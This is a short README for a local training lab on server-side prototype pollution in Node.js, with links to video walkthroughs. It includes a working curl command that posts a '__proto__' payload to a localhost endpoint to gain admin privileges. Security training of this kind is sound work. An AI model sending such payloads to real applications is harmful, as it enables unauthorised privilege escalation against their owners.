# Prototype Pollution Lab

## Overview
Practice exploiting Server-Side Prototype Pollution (SSPP) vulnerabilities in modern JavaScript/Node.js web runtimes (PortSwigger Web Security Academy topic 25).

- **Default Port / Access**: `http://localhost:8096`
- **Shortcut**: `./lab start prototype-pollution`

---

## Exploitation Workflow

1. **Verify Baseline Access**:
   Access `http://localhost:8096/` — notice `Admin Flag: ACCESS_DENIED`.

2. **Pollute `Object.prototype` via `__proto__`**:
   Send a JSON POST request to `/api/update` polluting the root object:
   ```bash
   curl -X POST http://localhost:8096/api/update \
     -H "Content-Type: application/json" \
     -d '{"__proto__": {"admin": true}}'
   ```

3. **Verify Pollution & Privilege Escalation**:
   Refresh `http://localhost:8096/`. The prototype property `admin` is now inherited across all JavaScript objects in the Node process, unlocking the Admin Flag!

---

## YouTube Walkthroughs & Solving Guides
- [The Cyber Terminal - Exploiting Prototype Pollution in JavaScript for Server-Side RCE](https://www.youtube.com/watch?v=9UAQ1VzSq8Q)
- [Pink Boo - Detecting Server-Side Prototype Pollution (PortSwigger Academy)](https://www.youtube.com/watch?v=0KYDTt5DiNM)
- [CyberSecurityTV - Prototype Pollution Attack Explained](https://www.youtube.com/watch?v=__65_GFERKs)
